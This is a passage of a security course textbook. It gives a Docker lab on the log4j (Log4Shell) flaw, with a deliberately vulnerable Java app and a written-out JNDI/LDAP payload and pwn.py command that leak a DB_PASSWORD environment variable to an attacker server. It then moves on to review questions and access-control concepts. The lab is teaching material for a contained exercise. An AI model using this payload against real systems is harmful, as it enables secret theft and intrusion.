
`package com.sensepost.log4jpwn; import org.apache.logging.log4j.Logger; import org.apache.logging.log4j.LogManager; import static spark.Spark.*; public class App { static final Logger logger = LogManager.getLogger(App.class.getName()); public static void main(String[] args) { port(8080); get("/*", (req, res) -> { String ua = req.headers("User-Agent"); String pwn = req.queryParams("pwn"); String pth = req.pathInfo(); System.out.println("logging ua: " + ua); System.out.println("logging pwn: " + pwn); System.out.println("logging pth: " + pth); // trigger logger.error(ua); logger.error(pwn); logger.error(pth); return "ok: ua: " + ua + " " + "pwn: " + pwn + " pth:" + pth; }); } }`

Our attacker container has [`pwn.py`](https://github.com/leonjza/log4jpwn/blob/master/pwn.py), also by leonjza, which does two things:

- Runs a fake LDAP server in the background on port 8888
- Sends a request with the JNDI URI referencing the fake LDAP server asking for a Java value to leak
- Parses and prints the response

Using this setup we can show how log4j can be used to leak sensitive information from running processes. We will use it to leak the value of the environment variable `DB_PASSWORD`. As it isn’t uncommon to store secrets in environment variables on running containers, this should suffice to see just how devastating this exploit can be.

Start by downloading [the zip archive of this lab](https://github.com/rxt1077/it230/blob/main/labs/log4j.zip?raw=true) and unzipping it in a directory where you have write permissions and can navigate to in a terminal application. Once you’ve done that, you can bring the lab up by typing `docker-compose up` in that directory. Output should look similar to what you see below:

```
PS C:\Users\rxt1077\it230\labs\log4j> docker-compose up
[+] Running 2/0 - Container log4j-target-1 Created 0.0s - Container log4j-attacker-1 Created 0.0s
Attaching to log4j-attacker-1, log4j-target-1
log4j-attacker-1 exited with code 0
log4j-target-1 | WARNING: sun.reflect.Reflection.getCallerClass is not supported. This will impact performance.
log4j-target-1 | [Thread-0] INFO org.eclipse.jetty.util.log - Logging initialized @815ms to org.eclipse.jetty.util.log.Slf4jLog
log4j-target-1 | [Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - == Spark has ignited ...
log4j-target-1 | [Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - >> Listening on 0.0.0.0:8080
log4j-target-1 | [Thread-0] INFO org.eclipse.jetty.server.Server - jetty-9.4.z-SNAPSHOT; built: 2019-04-29T20:42:08.989Z; git: e1bc35120a6617ee3df052294e433f3a25ce7097; jvm 11.0.14+9-post-Debian-1deb11u1
log4j-target-1 | [Thread-0] INFO org.eclipse.jetty.server.session - DefaultSessionIdManager workerName=node0
log4j-target-1 | [Thread-0] INFO org.eclipse.jetty.server.session - No SessionScavenger set, using defaults
log4j-target-1 | [Thread-0] INFO org.eclipse.jetty.server.session - node0 Scavenging every 600000ms
log4j-target-1 | [Thread-0] INFO org.eclipse.jetty.server.AbstractConnector - Started ServerConnector@401fccd3{HTTP/1.1,[http/1.1]}{0.0.0.0:8080}
log4j-target-1 | [Thread-0] INFO org.eclipse.jetty.server.Server - Started @960ms
```

You’ll notice that the `target` service is up and running the `log4jpwn` example application and that its output goes straight to the screen. The `attacker` service will exit immediately as it is meant for interactive use and doesn’t run anything in the background. In another terminal, navigate to the lab directory again and run `docker-compose run attacker bash`. This will be the shell that you use to attack the target:

```
PS C:\Users\rxt1077\it230\labs\log4j> docker-compose run attacker bash
root@3971c61303c8:/#
```

Notice how the prompt changes once we are in the container.

In the attack shell, use the `ip` command to determine the IPv4 address of your container. We will need this since the `attacker` container will be listening for connections from `target` once the exploit string is logged.

```
root@3971c61303c8:/# ip addr show dev eth0
58: eth0@if59: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
inet <IP_ADDRESS>/16 brd 172.20.255.255 scope global eth0
valid_lft forever preferred_lft forever
```

You’re IP is not `<IP_ADDRESS>`; it is whatever you find in its place!

Once you have the IP address, you can run the `pwn.py` script on the `attacker` container and you should be able to read the `DB_PASSWORD` environment variable on the `target` container.

```
root@3971c61303c8:/# python /pwn.py --listen-host <IP_ADDRESS> --exploit-host <IP_ADDRESS> --target http://target:8080 --leak '${env:DB_PASSWORD}'
i| starting server on <IP_ADDRESS>:8888
i| server started
i| setting payload in User-Agent header
i| sending exploit payload ${jndi:ldap://<IP_ADDRESS>:8888/${env:DB_PASSWORD}} to http://target:8080/
i| new connection from <TARGETS_IP>:44050
v| extracted value: <DB_PASSWORD>
i| request url was: http://target:8080/
i| response status code: 200
```

Docker Compose will resolve service names to IP addresses so the target URI doesn’t require finding an IP. The value of `DB_PASSWORD` can will be here.

## 6.10. Review Questions

What does it mean that security solutions are migrating from physical devices to cloud services? Give an example.

In your opinion, which is more damaging, a false positive or a false negative? Why?

What are the applications of a site-to-site VPN? Give an example of a scenario where an office might employ one.

## 7. Access Controls

Access controls seek to provide tools for `identification`, `authentication`, `authorization`, and `accounting` with regard to a particular resource. While individual controls may provide multiple parts, it is still important to understand what each part represents:

### Identification

The act of identifying an actor or `something` that is used to identify an actor. This could be as simple as a drivers license or as complex as a cryptographic signature that can only be made by the bearer of a private key. Example: A delivery driver presenting an employee badge.

### Authentication

This step occurs when an identity is confirmed through the use of a specific process. This could be the process through which the private key is used or perhaps another biometric process such as reading a fingerprint. In either case the `authentication` is the method by which we verify identity. Example: Examining the delivery driver’s badge.

### Authorization

Authorization is when an actor is given permission to access a resource. In casual conversation we may assume that `authorization` is a foregone conclusion once an actor has progressed this far, but in actuality authorization relies on the previous steps being completed and may in fact fail. A system may have identified who someone was through authentication with a username and password, but that user is not set up to have access to a resource. In this case the `authorization` step would fail. To continue with our delivery driver example: Allowing the delivery driver to pick up a package.

### Accounting

Finally accounting is the process through which a record of access to the resource is recorded. Accounting may be a log of users who have signed in an log of what resources they each accessed. In a similar vein, with the delivery driver: A record of the driver’s visit is written in the sign-in book at the front desk.

## 7.1. General Principles and Techniques

### 7.1.1. Least Privilege

The principle of least privilege states that an actor should only be given access to resources as necessary and with the permissions necessary to complete their task. These resources may be processes, programs, or even user accounts. This principle reduces an attack surface and helps stop the spread of malware as a single compromised account will not have access to all of the resources.

Least privilege is also an important concept for compliance purposes. For example, laws may require and audit of all accounts that have Internet access. By limiting accounts that have Internet access to only the accounts of actors that require Internet access to complete their tasks, it makes it easier to be in compliance.

### 7.1.2. Multi-factor Authentication (MFA)

Multi-factor authentication is a technique that requires actors to provide two or more pieces of information to be used as identification. Some examples of identification would be usernames and passwords, token codes, a physical token, or biometric data. Typically it is suggested to use "something you have and something you know" for example the code in an SMS message to your phone (you have your phone) and a password (you know your password).

There are many popular products for MFA, most of which are based on the time based creation of a code. [Google Authenticator](https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2&hl=en_US&gl=US) and [Authy](https://authy.com/) are each phone applications which generate codes from a cryptographic seed which is synced with the verifying system. RSA IDs generate similar codes on a dedicated hardware device.

### 7.1.3. MAC, DAC, RBAC, and ABAC

There are several different authorization models that can be used. Mandatory Access Control (MAC) requires all objects (files, directories, devices, etc.) to have a security label that identifies who can access it and how. This is a particularly stringent form of access control which requires a great deal of effort to implement and maintain, but results in a high level of security. Discretional Access Control (DAC) simplifies things by allowing owners of objects to determine which permissions groups/users should be given to that object. This offers great flexibility and ease of implementation, but can result in a less secure environment if the owner of the object is compromised. Role-Based Access Control (RBAC) builds off of DAC uses a core set of roles within a system to determine who has different levels of access to objects. RBAC is a common and flexible model which can be intelligently used to implement DAC or MAC. Attribute-Based access control (ABAC) is a newer model that builds off of RBAC and uses more general attributes instead of just roles. ABAC can determine who has different levels of access to objects based on the attributes of the object, the user, the action, or even an external context. These attributes can be used together in any way that can be codified into a rule. For example, "Give Fred read access to non-classified documents in this folder from 9:00AM to 5:00PM."
